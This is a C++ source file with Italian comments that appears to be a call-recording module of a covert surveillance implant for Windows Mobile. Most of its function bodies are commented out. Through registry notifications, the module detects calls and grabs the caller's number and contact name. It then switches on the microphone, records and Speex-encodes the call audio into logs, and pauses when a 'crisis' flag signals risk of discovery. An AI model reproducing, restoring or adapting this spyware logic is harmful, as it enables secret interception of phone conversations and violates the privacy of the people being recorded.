#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "Conf.h"
#include <exception>
#include <common_new\regext.h>

#include <mmsystem.h>
///#include <winreg.h>
///#include "CWaveForm.h"
///#include "speex/speex.h"
#include "RecordedCalls.h"
#include "CallBacks.h"

#include "FunctionFunc.h"

BOOL bLocalCallIsrecording;
DWORD dwLocalCallBuffInCount;
///WAVEHDR	tagLocalCallWaveHdr[LOCAL_CALL_COUNT_BUFF];
///CWaveformIn *callObj;
WCHAR LocalCallPhoneNumber[PHONE_NUMBER_LEN]; // Contiene il numero di telefono
WCHAR LocalCallerName[256]; // Contiene il nome del chiamante in rubrica
WCHAR LocalCallerString[512]; // Contiene numero di telefono ed eventuale nome in rubrica

DWORD local_call_buffer_len = LOCAL_CALL_DEF_BUFFER_LEN;
DWORD local_call_compress_factor = LOCAL_CALL_DEF_COMPRESS_FACTOR; 

void SaveEncode(BYTE *wave, DWORD total_size)
{
/***
	short *bit_sample;
	void *state;
	float *input;
	BYTE *to_write;
	BYTE *source_ptr;
	BYTE *cbits;
///	SpeexBits bits;
	DWORD frame_size = 0;
	DWORD i, nbBytes;	
	DWORD complexity = 1;
	VoiceAdditionalData vad;
	Log log;

	// Crea un nuovo encoder in wide mode
	state = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_NB));
	speex_encoder_ctl(state, SPEEX_SET_QUALITY, &local_call_compress_factor);
	speex_encoder_ctl(state, SPEEX_SET_COMPLEXITY, &complexity);
	speex_bits_init(&bits);
	speex_encoder_ctl(state, SPEEX_GET_FRAME_SIZE, &frame_size);

	if (!frame_size) {
		SPEEX_FREE;
		return;
	}

	// Allochiamo il buffer di output grande quanto quello originale (per sicurezza)
	if (!(to_write = new(std::nothrow) BYTE[frame_size * LOCAL_CALL_SAMPLE_SIZE])) {
		SPEEX_FREE;
		return;
	}
	cbits = to_write + sizeof(DWORD); // Punta al blocco dati, mentre la prima DWORD conterra' la dimensione

	// Allochiamo il buffer di elaborazione
	if (!(input = new(std::nothrow) FLOAT[frame_size])) {
		SAFE_DELETE(to_write);
		SPEEX_FREE;
		return;
	}

	unsigned __int64 stop_time = GetTime();
	unsigned __int64 tsize = total_size;

	vad.uVersion = CALL_LOG_VERSION;
	vad.uChannel = CHANNEL_INPUT;
	vad.uProgramType = LOGTYPE_CALL_MOBILE;
	vad.uSampleRate = CALL_SAMPLE_RATE | LOG_AUDIO_CODEC_SPEEX;
	vad.uIngoing = 0; // Non lo sappiamo per il momento
	vad.stop.dwHighDateTime = (DWORD)((stop_time & 0xffffffff00000000) >> 32);
	vad.stop.dwLowDateTime = (DWORD)(stop_time & 0x00000000ffffffff);
	
	stop_time -= (((tsize / 2) / CALL_SAMPLE_RATE) * 10000000);
	vad.start.dwHighDateTime = (DWORD)((stop_time & 0xffffffff00000000) >> 32);
	vad.start.dwLowDateTime = (DWORD)(stop_time & 0x00000000ffffffff);

	if (wcslen(LocalCallerName)) {
		wsprintf(LocalCallerString, L"%s (%s)", LocalCallPhoneNumber, LocalCallerName);
	} else {
		wsprintf(LocalCallerString, L"%s", LocalCallPhoneNumber);
	}

	vad.uCallerIdLen = 0; // Non lo sappiamo per il momento
	vad.uCalleeIdLen = WideLen(LocalCallerString);	

	BYTE *pData = new(std::nothrow) BYTE[sizeof(vad) + vad.uCalleeIdLen + vad.uCallerIdLen];

	if (pData == NULL) {
		SAFE_DELETE(to_write);
		SAFE_DELETE(input);
		SPEEX_FREE;
		return;
	}

	ZeroMemory(pData, sizeof(vad) + vad.uCalleeIdLen + vad.uCallerIdLen);

	BYTE *pTmp = pData;
	CopyMemory(pData, &vad, sizeof(vad));
	pTmp += sizeof(vad);

	// Non ce l'abbiamo ancora
	if (vad.uCallerIdLen) {
		//memcpy(pTmp, )
	}

	if (vad.uCalleeIdLen) {
		CopyMemory(pTmp, LocalCallerString, WideLen(LocalCallerString));
	}

	if (log.CreateLog(LOGTYPE_CALL, pData, sizeof(vad) + vad.uCalleeIdLen + vad.uCallerIdLen, MMC1) == FALSE) {
		SAFE_DELETE(to_write);
		SAFE_DELETE(input);
		delete[] pData;
		SPEEX_FREE;
		return;
	}

	delete[] pData;

	// Continua finche' dopo source_ptr non rimane ancora spazio per un frame intero
	for (source_ptr=wave; source_ptr+(frame_size*LOCAL_CALL_SAMPLE_SIZE)<=wave+total_size; source_ptr+=(frame_size*LOCAL_CALL_SAMPLE_SIZE)) {
		// Copiamo i campioni a 16 bit dentro dei float
		bit_sample = (short *)source_ptr;
		for (i=0; i<frame_size; i++)
			input[i] =  bit_sample[i];

		speex_bits_reset(&bits);
		speex_encode(state, input, &bits);
		// Encoda dentro il buffer di output
		nbBytes = speex_bits_write(&bits, (char *)cbits, frame_size*LOCAL_CALL_SAMPLE_SIZE);
		if (nbBytes > (frame_size*LOCAL_CALL_SAMPLE_SIZE))
			continue; // Check paranoico

		// Copia la lunghezza nei primi 4 byte per fare un unica scrittura su file
		CopyMemory(to_write, &nbBytes, sizeof(DWORD)); 
		log.WriteLog(to_write, nbBytes + sizeof(DWORD));
	}

	log.CloseLog();
	SAFE_DELETE(to_write);
	SAFE_DELETE(input);
	SPEEX_FREE;
***/
}


void CALLBACK LocalCallWaveInProc(HWAVEIN hwi, UINT uMsg, DWORD dwInstance, WAVEHDR *dwParam1, DWORD dwParam2)
{
/***
	if (uMsg == MM_WIM_DATA) {
		if (dwParam1->dwBytesRecorded > 0)
			SaveEncode((BYTE *)dwParam1->lpData, dwParam1->dwBytesRecorded);

		if (bLocalCallIsrecording) {
			waveInUnprepareHeader(hwi, dwParam1, sizeof(WAVEHDR));

			dwParam1->dwFlags = 0;
			dwParam1->dwBytesRecorded = 0;
			waveInPrepareHeader(hwi, dwParam1, sizeof(WAVEHDR));
			waveInAddBuffer(hwi, dwParam1, sizeof(WAVEHDR));
		} else {
			dwLocalCallBuffInCount++;	
		}
	}
***/
}


BOOL RecordStop(BOOL is_finished)
{
/***
	FILETIME ft;
	SYSTEMTIME st;
	VoiceAdditionalData vad;
	Log log;

	if (callObj == NULL)
		return FALSE;

	bLocalCallIsrecording = FALSE;
	callObj->Reset();

	// Aspetta che abbia flushato i buffer
	while (dwLocalCallBuffInCount < LOCAL_CALL_COUNT_BUFF)
		_Sleep(500);

	// Inserisce i tag di fine chiamata
	if (is_finished) {
		GetSystemTime(&st);
		SystemTimeToFileTime(&st, &ft);

		vad.uVersion = CALL_LOG_VERSION;
		vad.uChannel = CHANNEL_INPUT;
		vad.uProgramType = LOGTYPE_CALL_MOBILE;
		vad.uSampleRate = CALL_SAMPLE_RATE | LOG_AUDIO_CODEC_SPEEX;
		vad.uIngoing = 0; // Non lo sappiamo per il momento
		vad.stop.dwHighDateTime = ft.dwHighDateTime;
		vad.stop.dwLowDateTime = ft.dwLowDateTime;
		vad.start.dwHighDateTime = ft.dwHighDateTime;
		vad.start.dwLowDateTime = ft.dwLowDateTime;

		wsprintf(LocalCallerString, L"%s (%s)", LocalCallPhoneNumber, LocalCallerName);

		vad.uCallerIdLen = 0; // Non lo sappiamo per il momento
		vad.uCalleeIdLen = WideLen(LocalCallerString);

		BYTE *pData = new(std::nothrow) BYTE[sizeof(vad) + vad.uCalleeIdLen + vad.uCallerIdLen];

		if (pData == NULL) {
			delete callObj;
			callObj = NULL;
			return FALSE;
		}

		ZeroMemory(pData, sizeof(vad) + vad.uCalleeIdLen + vad.uCallerIdLen);

		BYTE *pTmp = pData;
		CopyMemory(pData, &vad, sizeof(vad));
		pTmp += sizeof(vad);

		// Non ce l'abbiamo ancora
		if (vad.uCallerIdLen) {
			
		}

		if (vad.uCalleeIdLen) {
			CopyMemory(pTmp, LocalCallerString, WideLen(LocalCallerString));
		}

		UINT dummy = 0xFFFFFF;

		if (log.CreateLog(LOGTYPE_CALL, pData, sizeof(vad) + vad.uCalleeIdLen + vad.uCallerIdLen, MMC1)) {
			log.WriteLog((BYTE *)&dummy, sizeof(UINT));
		}

		log.CloseLog();

		delete[] pData;
	}

	callObj->Close();

	for (int j = 0; j < LOCAL_CALL_COUNT_BUFF; j++) {
		callObj->UnprepareHeader(&(tagLocalCallWaveHdr[j]), sizeof(WAVEHDR));
		SAFE_FREE(tagLocalCallWaveHdr[j].lpData);
	}

	delete callObj;
	callObj = NULL;
	***/
	return TRUE;
}

BOOL RecordStart()
{
/***
	WAVEFORMATEX in_pcmWaveFormat;
	CWaveform wave;
	UINT count = CWaveform::InGetNumDevs();

	dwLocalCallBuffInCount = 0;

	for (UINT i = 0; i < count && callObj == NULL; i++) {
		WAVEINCAPS wic;

		CWaveform::InGetDevCaps(i, &wic, sizeof(WAVEINCAPS));
		if (wic.dwFormats & WAVE_FORMAT_1M16) {
			ZeroMemory(&in_pcmWaveFormat, sizeof(WAVEFORMATEX));
			CWaveform::PrepareWaveFormat(&in_pcmWaveFormat, WAVE_FORMAT_PCM, 1, CALL_SAMPLE_RATE, 16);
			callObj = wave.InOpen(i, &in_pcmWaveFormat, (DWORD_PTR) LocalCallWaveInProc, 0, CALLBACK_FUNCTION);
		}
	}

	if (callObj == NULL) 
		return FALSE;

	ZeroMemory(tagLocalCallWaveHdr, sizeof(tagLocalCallWaveHdr));
	for (UINT j = 0; j < LOCAL_CALL_COUNT_BUFF; j++) {
		tagLocalCallWaveHdr[j].dwBufferLength = local_call_buffer_len;
		tagLocalCallWaveHdr[j].dwLoops = 1;
		// Alloca i buffer di registrazione e li prepara
		if ( !(tagLocalCallWaveHdr[j].lpData = (char *)new(std::nothrow) CHAR[tagLocalCallWaveHdr[j].dwBufferLength]) )  {
			for (UINT k = 0; k < j; k++) {
				SAFE_DELETE(tagLocalCallWaveHdr[k].lpData);
			}

			callObj->Close();
			delete callObj;
			callObj = NULL;
			return FALSE;
		}
	}

	for (UINT j = 0; j < LOCAL_CALL_COUNT_BUFF; j++) { 
		callObj->PrepareHeader(&(tagLocalCallWaveHdr[j]), sizeof(WAVEHDR));
		callObj->AddBuffer(&(tagLocalCallWaveHdr[j]), sizeof(WAVEHDR));
	}

	bLocalCallIsrecording = TRUE;
	callObj->Start();
***/
	return TRUE;
}

DWORD WINAPI RecordedCalls(LPVOID lpParam) {
/***
	Module *me = (Module *)lpParam;
	Configuration *conf = me->getConf();
	HANDLE eventHandle;

	HKEY hPhoneState;
	DWORD dwType = 0;
	WCHAR szData[PHONE_NUMBER_LEN], szName[400];
	DWORD cbData = 0;
	BOOL bCallStatus = FALSE, bCrisis = FALSE, bPrevState = FALSE;
	Device *deviceObj = Device::self();
	Status *statusObj = Status::self();
	HREGNOTIFY hNotify;
	HRESULT hRes;

	try {
		local_call_buffer_len = (DWORD)conf->getInt(L"buffer");
	} catch (...) {
		local_call_buffer_len = 524288;
	}

	try {
		local_call_compress_factor = (DWORD)conf->getInt(L"compression");
	} catch (...) {
		local_call_compress_factor = 5;
	}

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();

	DBG_TRACE(L"Debug - RecordedCalls.cpp - Call Module started\n", 5, FALSE);

	bLocalCallIsrecording = FALSE;
///	callObj = NULL;

	ZeroMemory(LocalCallPhoneNumber, sizeof(LocalCallPhoneNumber));
	ZeroMemory(LocalCallerName, sizeof(LocalCallerName));
	ZeroMemory(LocalCallerString, sizeof(LocalCallerString));
	ZeroMemory(szName, sizeof(szName));

	if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\State\\Phone", 0, 0, &hPhoneState) != ERROR_SUCCESS) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	// Se la chiamata e' gia' in corso la callback non verra' notificata, quindi checkiamo da noi il valore
	FILETIME ft = {0};
	cbData = sizeof(ft);

	if (_RegQueryValueExW(hPhoneState, L"Call Start Time", NULL, &dwType, (LPBYTE) &ft, &cbData) == ERROR_SUCCESS) {
		bCallStatus = TRUE;
	}

	hRes = RegistryNotifyCallback(hPhoneState, NULL, L"Call Start Time", CallBackNotification, 
									(DWORD)&bCallStatus, NULL, &hNotify);

	if (hRes != S_OK) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	LOOP {
		// Valorizziamo il flag di crisi
		if ((statusObj->Crisis() & CRISIS_CALL) == CRISIS_CALL) {
			bCrisis = TRUE;
		} else {
			bCrisis = FALSE;
		}

		while (bCrisis) {
			DBG_TRACE(L"Debug - RecordedCalls.cpp - Call Module is in crisis\n", 6, FALSE);

			if (bCallStatus) {
				bCallStatus = FALSE;
				RecordStop(TRUE);
				ZeroMemory(LocalCallPhoneNumber, sizeof(LocalCallPhoneNumber));
				deviceObj->ReleaseMicPowerState();
			}

			_WaitForSingleObject(eventHandle, 10000);

			if (me->shouldStop()) {
				DBG_TRACE(L"Debug - Microphone.cpp - Microphone Module clean stop while in crisis [0]\n", 5, FALSE);
				RegistryCloseNotification(hNotify);
				_RegCloseKey(hPhoneState);
				me->setStatus(MODULE_STOPPED);
				return 0;
			}

			if ((statusObj->Crisis() & CRISIS_CALL) != CRISIS_CALL) {
				bCrisis = FALSE;
			}
		}

		if (bPrevState != bCallStatus) {
			bPrevState = bCallStatus;

			if (bPrevState) { // Chiamata in corso!
				ZeroMemory(szData, sizeof(szData));
				ZeroMemory(szName, sizeof(szName));
				cbData = sizeof(szData) - 1;
				_RegQueryValueExW(hPhoneState, L"Caller Number", NULL, &dwType, (LPBYTE) &szData, &cbData);
				bCallStatus = TRUE;
				wcscpy_s(LocalCallPhoneNumber, PHONE_NUMBER_LEN, szData);
				cbData = sizeof(szName) - 1;
				_RegQueryValueExW(hPhoneState, L"Caller Name", NULL, &dwType, (LPBYTE) &szName, &cbData);
				wcscpy_s(LocalCallerName, 256, szName);

				deviceObj->SetMicPowerState();
				RecordStart();	
			} else { // Chiamata terminata!
				bCallStatus = FALSE;
				RecordStop(TRUE);
				ZeroMemory(LocalCallPhoneNumber, sizeof(LocalCallPhoneNumber));
				deviceObj->ReleaseMicPowerState();
			}
		}

		_WaitForSingleObject(eventHandle, 10000);

		if (me->shouldStop()) {
			if (bCallStatus) {
				RecordStop(FALSE);
				ZeroMemory(LocalCallPhoneNumber, sizeof(LocalCallPhoneNumber));
				deviceObj->ReleaseMicPowerState();
			}

			RegistryCloseNotification(hNotify);
			_RegCloseKey(hPhoneState);

			me->setStatus(MODULE_STOPPED);
			DBG_TRACE(L"Debug - RecordedCalls.cpp - Call Module clean stop\n", 5, FALSE);
			return 0;
		}
	}
***/
	return 0;
}